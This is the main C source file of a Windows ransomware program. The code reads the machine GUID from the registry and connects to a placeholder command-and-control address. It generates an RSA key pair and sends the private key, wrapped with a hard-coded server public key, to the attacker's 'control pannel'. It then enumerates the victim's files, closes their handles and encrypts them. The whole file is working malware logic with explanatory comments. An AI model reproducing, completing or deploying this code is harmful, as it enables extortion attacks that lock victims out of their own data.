#include "common.h"
#include "crypt.h"
#include "sock.h"
#include "tools.h"

int main(int argc, char* argv[]) {
	NTSTATUS status;
	WSADATA wsa;
	SOCKET sock = INVALID_SOCKET;
	NCRYPT_PROV_HANDLE handle = 0, shandle = 0;
	NCRYPT_KEY_HANDLE key = 0, skey = 0;
	int sock_res = 0;
	HKEY hkey = NULL;
	LPVOID pri_key_buff = 0, tmp, read_file = 0, write_file = 0, machine_key = 0;
	DWORD pri_key_len = 0, pub_key_len = 0, file_size = 0, ret = 0, do_more = 0, decrypt_size = 0, key_object_len = 0, file_path_len = 0, tfile_path_len = 0, len = 0, type = 0, machine_key_size = 0;
	USHORT pmachine = 0, pnmachine = 0;
	pFileLinkedList file_head = 0, file_tail = 0;
	pAES_KEY_DIR key_head = 0, act = 0;
	BCRYPT_ALG_HANDLE alg_handle = 0;
	BCRYPT_KEY_HANDLE key_handle = 0;
	PBYTE key_object = NULL, pubkey = NULL;
	WIN32_FIND_DATA ffd;
	char file_path[MAX_PATH] = {}, path_file[MAX_PATH] = {}, buff[1024] = {};

	if (load_public_key(NULL, &pub_key_len) == false) {
		printf("failed to load public key.\n");
		return 1;
	}
	pubkey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, pub_key_len);
	if (load_public_key(pubkey, &pub_key_len) == false) {
		printf("failed to load public key.\n");
		return 1;
	}

	if (import_asymmetric_key(&shandle, &skey, 155, (LPVOID)pubkey) == false) {
		printf("import failed.\n");
		return 1;
	}

	machine_key = HeapAlloc(GetProcessHeap(), 0, 128);
	machine_key_size = 128;
	type = REG_SZ;
	
	
	if (!NT_SUCCESS(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", NULL, KEY_READ | KEY_WOW64_64KEY, &hkey))) {
		if (!NT_SUCCESS(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", NULL, KEY_READ, &hkey))) {
			printf("failed to read machine key %lu\n", GetLastError());
		}
	}
	if (hkey == NULL) {
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", NULL, KEY_READ, &hkey);
	}
	if ((status = RegQueryValueExW(hkey, L"MachineGuid", NULL, &type, (PBYTE)machine_key, &machine_key_size)) != ERROR_SUCCESS) {
		printf("Failed 0x%x.\n", status);
	}
	RegCloseKey(hkey);

	char* _argv[2] = { (char*)"99999",(char*)"999.888.777.666" };
	
	// Initialize Winsock
	
	if (init_sock(&wsa, sock, _argv) == false) {
		printf("initializing socket failed.\n");
		return 1;
	}

	//we generate an RSA key to encrypt the AES keys used to encrypt the files and save the encrypted keys in the targets computer
	if (generate_asymmetric_key(&handle, &key, 0) == false) {
		printf("generate_asymmetric_key failed.\n");
		return 1;
	}
	if (export_key(&key, 0, &pri_key_len, BCRYPT_RSAFULLPRIVATE_BLOB) == false) {
		printf("export1 private failed.\n");
		return 1;
	}
	pri_key_buff = HeapAlloc(GetProcessHeap(), 0, pri_key_len + strlen(CLIENT_KEY_DEF));
	if (pri_key_buff == NULL) {
		printf("sendbuf memory allocation failed.\n");
		return 1;
	}
	if (export_key(&key, pri_key_buff, &pri_key_len, BCRYPT_RSAFULLPRIVATE_BLOB) == false) {
		printf("export2 key failed.\n");
		return 1;
	}
	//after creating the RSA key we send the private-key to control pannel and encrypt it with the hard-coded control-pannel public-key
	while (1) {
		if (send_key(pri_key_buff, pri_key_len, machine_key, machine_key_size, skey, sock) == false) {
			printf("sending key failed.\n");
			return 1;
		}
		if ((ret = recv(sock, (char*)buff, 1024, 0)) == SOCKET_ERROR) {
			break;
		}
		if (memcmp(buff, "done", 4) == 0) break;
		Sleep(10);
	}

	LoadAPI(); //First load native api

	list_files(file_head, file_tail); 
	
	close_handles(file_head); //close the handle so we can encrypt the files

	if (encrypt_files(file_tail, key_head) == false) {
		printf("encrypt_files failed.\n");
		return 1;
	}
	printf("encrypting completed.\n");
	if (save_config(key_head, file_tail, key) == false) {
		printf("save_config failed.\n");
		return 1;
	}
	printf("saving stuff completed.\n");
	HeapFree(GetProcessHeap(), 0, machine_key);
	NCryptFreeObject(handle);
	NCryptFreeObject(key);
	handle = NULL;
	key = NULL;
	closesocket(sock);
	WSACleanup();
	fgetc(stdin);
	return 0;
}
